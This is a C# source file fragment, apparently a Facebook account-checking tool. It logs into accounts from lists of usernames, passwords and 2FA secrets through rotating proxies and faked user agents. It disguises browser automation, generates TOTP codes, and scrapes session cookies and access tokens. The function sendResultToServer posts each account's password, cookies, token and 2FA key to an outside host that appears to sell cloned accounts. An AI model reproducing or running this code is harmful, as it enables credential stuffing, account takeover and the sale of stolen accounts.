                    if (FacebookInstances.getToken)
                        accessToken = getToken(driver, account.key2fa);

                    if (lsCookies == null && userAgent == null)
                    {
                        FacebookInstances.OnNewAccAdded(account, "error" + " - URL: " + mainUrl, null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }
                    //else if(accessToken != null)
                    //{
                    //    string cookies = "";
                    //    foreach (var cookie in lsCookies)
                    //    {
                    //        cookies += cookie.ToString();
                    //    }
                    //    FacebookInstances.OnNewAccAdded(account, "success", cookies, accessToken, userAgent);
                    //    var data = account.userName + "|" + account.pass + "|" + cookies + "|" + userAgent + "|" + accessToken;

                    //    sendResultToServer(data, "success");
                    //}
                    else if (driver.Url.Contains("checkpoint"))
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                            + "|" + userAgent + "|" + "checkpoint" + " - URL: " + mainUrl + "|" +
                            DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "checkpoint");
                    }
                    else if (driver.Url.Contains("confirmemail.php?") || driver.Url.Contains("confirmation"))
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                             + "|" + userAgent + "|" + "no-veri" + " - URL: " + mainUrl + "|" +
                             DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|no-veri";
                        FacebookInstances.OnNewAccAdded(account, "no-veri" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }
                    else
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }

                        string cookies = "";

                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }
                        }
                        if (!cookies.Contains("c_user"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "lostCookies" + " - URL: " + mainUrl, null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                             + "|" + userAgent + "|" + "success" + " - URL: " + mainUrl + "|" +
                             DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|verify";
                        FacebookInstances.OnNewAccAdded(account, "success" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }

                    driver.Close();
                    driver.Quit();

                }


            }
            catch (Exception e)
            {
                //var data = account.userName + "|" + account.pass;
                //sendResultToServer(data, "error");
                if (e.Message.Contains("proxy") || e.Message.Contains("name =\"login\"") || e.Message.Contains("timeout") && ProxyInstances.type == 9)
                {
                    FacebookInstances.OnNewAccAdded(account, new_proxy, null, null, userAgent);
                }
                else
                {
                    FacebookInstances.OnNewAccAdded(account, e.Message, null, null, userAgent);
                }

            }
            finally
            {
                try
                {
                    driver.Close();
                    driver.Quit();
                }
                catch
                {

                }

            }
        }

        public static ReadOnlyCollection<OpenQA.Selenium.Cookie> getCookie(IWebDriver driver)
        {
            try
            {
                // Get All available cookies
                var cookies = driver.Manage().Cookies.AllCookies;
                return cookies;

            }
            catch
            {
                return null;
            }
        }



        public static string getToken(IWebDriver driver, string key2fa)
        {
            try
            {
                driver.Navigate().GoToUrl(@"https://fb.com/pe");
                Thread.Sleep(3 * 1000);
                if (driver.Url.Contains("security/twofactor"))
                {
                    var ele2faInput = driver.FindElement(By.XPath("//input[@placeholder='Enter code']"));//placeholder="Enter code"
                    var secretKey = Base32Encoding.ToBytes(key2fa);
                    var totp = new Totp(secretKey);
                    var otp = totp.ComputeTotp();
                    ele2faInput.SendKeys(otp);
                    Thread.Sleep(1 * 1000);
                    driver.FindElements(By.XPath("//div[@class='x3nfvp2 x193iq5w xxymvpz']"))[1].Click();
                    Thread.Sleep(2 * 1000);
                }
                driver.Navigate().GoToUrl(@"https://fb.com/pe");
                var pageSource = driver.PageSource;
                if (pageSource.Contains("window.__accessToken="))
                {
                    var beginToken = pageSource.IndexOf("window.__accessToken=");
                    pageSource = pageSource.Substring(beginToken);
                    beginToken = pageSource.IndexOf('"');
                    pageSource = pageSource.Substring(beginToken + 1);
                    var endToken = pageSource.IndexOf('"');

                    var accessToken = pageSource.Substring(0, endToken);
                    return accessToken;
                }
                else
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
        }

        public static string getUserAgent(IWebDriver driver)
        {
            try
            {
                var userAgent = ((IJavaScriptExecutor)driver).ExecuteScript("return navigator.userAgent");
                return userAgent.ToString();
            }
            catch
            {
                return null;
            }
        }

        public static void sendResultToServer(string data, string type)
        {
            var client = new RestClient("https://sellclone24h.com/clone/t_upload.php");
            //var client = new RestClient("https://sellclone24h.nettt");
            client.Timeout = -1;
            var request = new RestRequest(Method.POST);
            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            request.AddParameter("data", data.Replace("\r", "").Replace("\n", ""));
            request.AddParameter("type", FacebookInstances.typeAcc + "-" + type);
            IRestResponse response = client.Execute(request);
            Console.WriteLine(response.Content);
        }

        public static bool PingHost(string proxy)
        {
            bool pingable = false;
            Ping pinger = null;

            try
            {
                HttpRequest httpRequest = new HttpRequest();
                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                httpRequest.ReadWriteTimeout = 15000;
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36";// Http.ChromeUserAgent();
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.SslCertificateValidatorCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                var response = httpRequest.Get($"https://www.facebook.com/", null);
                if (response.IsOK)
                {
                    pingable = true;
                }

            }
            catch (Exception ex)
            {
                return pingable;
            }

            return pingable;
        }
        public static string CookieStrFrom(CookieContainer container, string domain)
        {
            Uri uri = new Uri(domain);
            string ck = string.Empty;
            var cookies = container.GetCookies(uri);
            foreach (System.Net.Cookie cookie in cookies)
            {
                // concat your string or do what you want
                ck += cookie.Name + "=" + cookie.Value + ";";
            }
            return ck;
        }

        public static void requestMbasicLogin(Account account)
        {
            try
            {
                var client = new RestClient("https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated");
                client.Timeout = -1;
                var request = new RestRequest(Method.POST);
                request.AddHeader("authority", "mbasic.facebook.com");
                request.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                request.AddHeader("accept-language", "en-US,en;q=0.9");
                request.AddHeader("cache-control", "max-age=0");
                request.AddHeader("content-type", "application/x-www-form-urlencoded");

                request.AddHeader("origin", "https://mbasic.facebook.com");

                request.AddHeader("sec-ch-ua", "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"");
                request.AddHeader("sec-ch-ua-mobile", "?0");
                request.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                request.AddHeader("sec-fetch-dest", "document");
                request.AddHeader("sec-fetch-mode", "navigate");
                request.AddHeader("sec-fetch-site", "same-origin");
                request.AddHeader("sec-fetch-user", "?1");
                request.AddHeader("upgrade-insecure-requests", "1");
                client.UserAgent = "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36";
                request.AddParameter("lsd", "AVpQAaxvZJM");
                request.AddParameter("jazoest", "2985");
                request.AddParameter("m_ts", "1672136643");
                request.AddParameter("li", "aceqY2DP7aRcE3DeSVFP43Xf");
                request.AddParameter("try_number", "0");
                request.AddParameter("unrecognized_tries", "0");
                request.AddParameter("email", account.userName);
                request.AddParameter("pass", account.pass);
                request.AddParameter("login", "Log+In");
                request.AddParameter("bi_xrwh", "0");
                IRestResponse response = client.Execute(request);


                string stringCookie = CookieStrFrom(client.CookieContainer, "https://mbasic.facebook.com");
                var cookies = stringCookie.Split(';');

                ChromeDriver driver = null;
                var options = new ChromeOptions();
                options.AddArgument("--window-size=400,800");
                //options.AddArgument("--headless");
                options.AddArgument("ignore-certificate-errors");

                options.AddExcludedArgument("enable-automation");
                //options.AddAdditionalCapability("useAutomationExtension", false);
                options.AddArgument("--disable-web-security");
                options.AddArgument("--disable-blink-features=AutomationControlled");
                options.AddArgument("--no-sandbox");
                options.AddArgument("--start-maximized");
                options.AddUserProfilePreference("credentials_enable_service", false);
                options.AddUserProfilePreference("profile.password_manager_enabled", false);

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;
                driver = new ChromeDriver(service, options);

                foreach (string cookie in cookies)
                {
                    if (cookie == "") break;
                    var datacookie = cookie.Trim().Split('=');
                    OpenQA.Selenium.Cookie name = new OpenQA.Selenium.Cookie(datacookie[0], datacookie[1]);
                    driver.Manage().Cookies.AddCookie(name);
                }

                driver.Navigate().GoToUrl("https://mbasic.facebook.com");
            }
            catch { }
        }


        public static void InitMBasicRequest(Account account)
        {
            var random = new Random();
            while (true)
            {
                if (FacebookInstances.waitChangeIP)
                {
                    Thread.Sleep(1000);
                }
                else
                {
                    break;
                }
            }
            //var url = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100";
            var url = "https://mbasic.facebook.com/";
            string userAgent = null;
            string new_proxy = "";
            if (FacebookInstances.fakeUserAgent)
            {

                int a = random.Next(0, FacebookInstances.lsFakeUserAgent.Count);
                //FacebookInstances.queueFakeUserAgent.TryDequeue(out userAgent);
                userAgent = FacebookInstances.lsFakeUserAgent[a];
                if (userAgent != null)
                {
                    //FacebookInstances.queueFakeUserAgent.Enqueue(userAgent);
                }
                else
                {
                    userAgent = "";
                }
            }
            if (userAgent != "" && userAgent != null)
            {
                if (FacebookInstances.timeUa)
                {
                    var a = random.Next(0, 10);
                    var b = random.Next(1000, 10000);
                    var c = random.Next(10, 100);
                    var rdVersion = a + "." + b + "." + c;
                    userAgent = userAgent + rdVersion;
                    //var a = random.Next(0, 10);
                    //userAgent = userAgent + " " + DateTime.Now.AddDays(-a).AddHours(-a).ToString("dd/MM/yyyy HH':'mm':'ss");
                }
                else if (FacebookInstances.timeRealUa)
                {
                    userAgent = userAgent + " " + DateTime.Now.ToString("dd/MM/yyyy HH':'mm':'ss");
                }
            }

            if (ProxyInstances.userProxy == true)
            {
                while (ProxyInstances.Http.Count == 0)
                {
                    Thread.Sleep(5 * 1000);
                }
                if (!ProxyInstances.Http.TryDequeue(out new_proxy) || new_proxy == null)
                {
                    throw new Exception("proxy empty!");
                }
                else
                {
                    long currentTime = (long)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds;
                    if (ProxyInstances.type == 0 || ProxyInstances.type == 1
                        || ProxyInstances.type == 4 || ProxyInstances.type == 5
                        || ProxyInstances.type == 7 || ProxyInstances.type == 8 || ProxyInstances.type == 9
                        || ProxyInstances.type == 10 || ProxyInstances.type == 11 || ProxyInstances.type == 12
                        || ProxyInstances.type == 13 || ProxyInstances.type == 14)
                    {
                        if (currentTime - ProxyInstances.beginTime <= ProxyInstances.timeUpdate)
                        {
                            ProxyInstances.Http.Enqueue(new_proxy);
                        }
                    }
                    else
                        ProxyInstances.Http.Enqueue(new_proxy);
                }
            }
            FacebookInstances.numRan += 1;

            try
            {
                var httpRequest = new Request("", userAgent, new_proxy);

                //httpRequest.userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");
                var cookies = "";
                var checkRequest = Login.LoginMethodMBasic_XNET(httpRequest, account.userName, account.pass, account.key2fa, out cookies);
                if (checkRequest)
                {
                    var data = account.userName + "|" + account.pass + "|" + cookies + "|" + "" + "|" + account.key2fa
                                + "|" + account.locate + "|" + account.locateNew
                                 + "|" + userAgent + "|" + "success" + " - URL: " + url + "|" +
                                 DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                    FacebookInstances.OnNewAccAdded(account, "success" + " - URL: " + url, cookies, "", userAgent);
                    sendResultToServer(data, "success");
                }
                else
                {
                    FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                }
            }
            catch (Exception e)
            {
                FacebookInstances.OnNewAccAdded(account, e.Message, null, null, userAgent);
            }
        }

        public static void InitRequestLogin2(Account account)
        {
            var random = new Random();
            while (true)
            {
                if (FacebookInstances.waitChangeIP)
                {
                    Thread.Sleep(1000);
                }
                else
                {
                    break;
                }
            }
            //var url = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100";
            var url = "https://b-api.facebook.com/method/auth.login";
            string userAgent = null;
            string new_proxy = "";
            if (FacebookInstances.fakeUserAgent)
            {
                //Random r = new Random();
                //userAgent = FacebookInstances.lsUA[r.Next(FacebookInstances.lsUA.Count)];

                int a = random.Next(0, FacebookInstances.lsFakeUserAgent.Count);
                FacebookInstances.queueFakeUserAgent.TryDequeue(out userAgent);
                userAgent = FacebookInstances.lsFakeUserAgent[a];
                if (userAgent != null)
                {
                    FacebookInstances.queueFakeUserAgent.Enqueue(userAgent);
                }
                else
                {
                    userAgent = "";
                }
            }
            if (userAgent != "" && userAgent != null)
            {
                if (FacebookInstances.timeUa)
                {
                    var a = random.Next(0, 10);
                    var b = random.Next(1000, 10000);
                    var c = random.Next(10, 100);
                    var rdVersion = a + "." + b + "." + c;
                    userAgent = userAgent + rdVersion;
                    //var a = random.Next(0, 10);
                    //userAgent = userAgent + " " + DateTime.Now.AddDays(-a).AddHours(-a).ToString("dd/MM/yyyy HH':'mm':'ss");
                }
                else if (FacebookInstances.timeRealUa)
                {
                    userAgent = userAgent + " " + DateTime.Now.ToString("dd/MM/yyyy HH':'mm':'ss");
                }
            }

            if (ProxyInstances.userProxy == true)
            {
                while (ProxyInstances.Http.Count == 0)
                {
                    Thread.Sleep(5 * 1000);
                }
                if (!ProxyInstances.Http.TryDequeue(out new_proxy) || new_proxy == null)
                {
                    throw new Exception("proxy empty!");
                }
                else
                {
                    long currentTime = (long)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds;
                    if (ProxyInstances.type == 0 || ProxyInstances.type == 1
                        || ProxyInstances.type == 4 || ProxyInstances.type == 5
                        || ProxyInstances.type == 7 || ProxyInstances.type == 8 || ProxyInstances.type == 9
                        || ProxyInstances.type == 10 || ProxyInstances.type == 11 || ProxyInstances.type == 12
                        || ProxyInstances.type == 13 || ProxyInstances.type == 14)
                    {
                        if (currentTime - ProxyInstances.beginTime <= ProxyInstances.timeUpdate)
                        {
                            ProxyInstances.Http.Enqueue(new_proxy);
                        }
                    }
                    else
                        ProxyInstances.Http.Enqueue(new_proxy);
                }
            }
            FacebookInstances.numRan += 1;

            try
            {
                //var httpRequest = new Request("", userAgent, new_proxy);

                //httpRequest.userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");
                var cookies = "";
                //var checkRequest = Login.LoginMethodMBasic_XNET(httpRequest, account.userName, account.pass, account.key2fa, out cookies);



                string _data = Login.ResultData(account.userName, account.pass, account.key2fa, userAgent, new_proxy);
                if (_data.Contains("session_cookies"))
                {
                    var rawCookie = JObject.Parse(_data)["session_cookies"];
                    if (rawCookie == null)
                    {
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + "" + "|" + account.key2fa
                                    + "|" + account.locate + "|" + account.locateNew
                                     + "|" + userAgent + "|" + "sai pass" + " - URL: " + url + "|" +
                                     DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "sai pass" + " - URL: " + url, cookies, "", userAgent);
                        //sendResultToServer(data, "sai pass");
                        return;
                    }
                    foreach (dynamic item in rawCookie)
                    {
                        cookies += $"{item["name"]}={item["value"]};";
                    }
                    if (!cookies.Contains("heckpoint"))
                    {
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + "" + "|" + account.key2fa
                                    + "|" + account.locate + "|" + account.locateNew
                                     + "|" + userAgent + "|" + "success" + " - URL: " + url + "|" +
                                     DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "success" + " - URL: " + url, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }
                    else
                    {
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + "" + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                            + "|" + userAgent + "|" + "checkpoint" + " - URL: " + url + "|" +
                            DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint" + " - URL: " + url, cookies, "", userAgent);
                        sendResultToServer(data, "checkpoint");
                    }


                }
                else
                {
                    FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                }
                //if (_data == "ERROR")
                //    return null;
                //return null;

                return;


            }
            catch (Exception e)
            {
                FacebookInstances.OnNewAccAdded(account, e.Message, null, null, userAgent);
                return;
            }
        }


        public static void InitWWWRequest(Account account)
        {
            var random = new Random();
            try
            {

                while (true)
                {
                    if (FacebookInstances.waitChangeIP)
                    {
                        Thread.Sleep(1000);
                    }
                    else
                    {
                        break;
                    }
                }
                string userAgent = "";
                string new_proxy = "";
                if (FacebookInstances.fakeUserAgent)
                {

                    int a = random.Next(0, FacebookInstances.lsFakeUserAgent.Count);
                    //FacebookInstances.queueFakeUserAgent.TryDequeue(out userAgent);
                    userAgent = FacebookInstances.lsFakeUserAgent[a];
                    if (userAgent != null)
                    {
                        userAgent = userAgent.Trim().Replace("\r", "").Replace("\n", "");
                        //FacebookInstances.queueFakeUserAgent.Enqueue(userAgent);
                    }
                    else userAgent = "";

                }
                if (userAgent != "" && userAgent != null)
                {
                    if (FacebookInstances.timeUa)
                    {
                        var a = random.Next(0, 10);
                        var b = random.Next(1000, 10000);
                        var c = random.Next(10, 100);
                        var rdVersion = a + "." + b + "." + c;
                        userAgent = userAgent + rdVersion;
                        //var a = random.Next(0, 10);
                        //userAgent = userAgent +" " + DateTime.Now.AddDays(-a).AddHours(-a).ToString("dd/MM/yyyy HH':'mm':'ss");
                    }
                    else if (FacebookInstances.timeRealUa)
                    {
                        userAgent = userAgent + " " + DateTime.Now.ToString("dd/MM/yyyy HH':'mm':'ss");
                    }
                }

                if (ProxyInstances.userProxy == true)
                {
                    int checkProxy = 0;
                    while (ProxyInstances.Http.Count == 0)
                    {
                        checkProxy++;
                        Thread.Sleep(5 * 1000);
                        if (checkProxy > 50)
                        {
                            FacebookInstances.OnNewAccAdded(account, "proxy empty", null, null, null);
                            //FacebookInstances.MultiThrs.queueAccs.Enqueue(account);
                            //return;
                            throw new Exception("proxy empty");
                        }

                    }
                    //test tinsoft
                    //while (true)
                    //{
                    //    Thread.Sleep(1000);
                    //}


                    if (!ProxyInstances.Http.TryDequeue(out new_proxy) || new_proxy == null)
                    {
                        FacebookInstances.OnNewAccAdded(account, "proxy empty", null, null, null);
                        FacebookInstances.MultiThrs.queueAccs.Enqueue(account);
                        return;
                        throw new Exception("proxy empty!: " + new_proxy);
                    }
                    else
                    {
                        long currentTime = (long)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds;
                        if (ProxyInstances.type == 0 || ProxyInstances.type == 1
                            || ProxyInstances.type == 4 || ProxyInstances.type == 5
                            || ProxyInstances.type == 7 || ProxyInstances.type == 8 || ProxyInstances.type == 9
                            || ProxyInstances.type == 10 || ProxyInstances.type == 11 || ProxyInstances.type == 12
                            || ProxyInstances.type == 13 || ProxyInstances.type == 14)
                        {
                            if (currentTime - ProxyInstances.beginTime <= ProxyInstances.timeUpdate)
                            {
                                ProxyInstances.Http.Enqueue(new_proxy);
                            }
                        }
                        else
                            ProxyInstances.Http.Enqueue(new_proxy);
                    }
                }

                FacebookInstances.numRan += 1;

                try
                {
                    var httpRequest = new Request();
                    var url = "";
                    //httpRequest.userAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");
                    var cookies = "";
                    var checkRequest = -1;
                    if (FacebookInstances.requerstWWW && FacebookInstances.randomWWW == false)
                    {
                        url = " - URL: WWW";
                        checkRequest = Login.LoginMethodWWW_XNET(account.userName, account.pass, account.key2fa, userAgent, new_proxy, out cookies);
                    }
                    //checkRequest = Login.LoginWWW_HTTPRequest(account.userName, account.pass, account.key2fa, userAgent, new_proxy, out cookies);
                    else if (FacebookInstances.requerstWWWLogin && FacebookInstances.randomWWW == false)
                    {
                        url = " - URL: WWW/login";
                        checkRequest = Login.LoginMethodLoginWWW_XNET(account.userName, account.pass, account.key2fa, userAgent, new_proxy, out cookies);
                    }
                    //checkRequest = Login.LoginWWWLogin_HTTPRequest(account.userName, account.pass, account.key2fa, userAgent, new_proxy, out cookies);
                    else if (FacebookInstances.randomWWW == true)
                    {
                        if (random.Next(1, 3) % 2 == 0)
                        {
                            url = " - URL: WWW";
                            checkRequest = Login.LoginMethodWWW_XNET(account.userName, account.pass, account.key2fa, userAgent, new_proxy, out cookies);
                        }
                        else
                        {
                            url = " - URL: WWW/login";
                            checkRequest = Login.LoginMethodLoginWWW_XNET(account.userName, account.pass, account.key2fa, userAgent, new_proxy, out cookies);
                        }
                    }

                    if (checkRequest == 1)
                    {
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + "" + "|" + account.key2fa
                                    + "|" + account.locate + "|" + account.locateNew
                                     + "|" + userAgent + "|" + "success" + url + "|" +
                                     DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "success" + url, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }
                    else if (checkRequest == 0)
                    {
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + "" + "|" + account.key2fa
                                    + "|" + account.locate + "|" + account.locateNew
                                     + "|" + userAgent + "|" + "checkpoint" + url + "|" +
                                     DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint" + url, null, null, userAgent);
                        sendResultToServer(data, "checkpoint");
                    }
                    else
                    {
                        FacebookInstances.OnNewAccAdded(account, "error" + url, null, null, userAgent);
                    }
                }
                catch (Exception e)
                {
                    FacebookInstances.OnNewAccAdded(account, e.Message, null, null, userAgent);
                    if (e.Message.Contains("HTTP"))
                        FacebookInstances.MultiThrs.queueAccs.Enqueue(account);
                }
            }
            catch (Exception e)
            {
                if (e.Message.Contains("proxy empty"))
                    FacebookInstances.MultiThrs.queueAccs.Enqueue(account);
                StringBuilder sb = new StringBuilder();
                sb.Append("check complete: " + e + "\n");
                System.IO.File.AppendAllText("logComplete.txt", sb.ToString());
                sb.Clear();
            }
        }

        private static void sendHumanKeys(IWebElement element, string text)
        {
            Random r = new Random();
            for (int i = 0; i < text.Length; i++)
            {
                try
                {
                    Thread.Sleep((int)(r.Next(1, 3) * 5));
                }
                catch (Exception e) { }
                string s = text[i].ToString();
                element.SendKeys(s);
            }
        }
    }
}
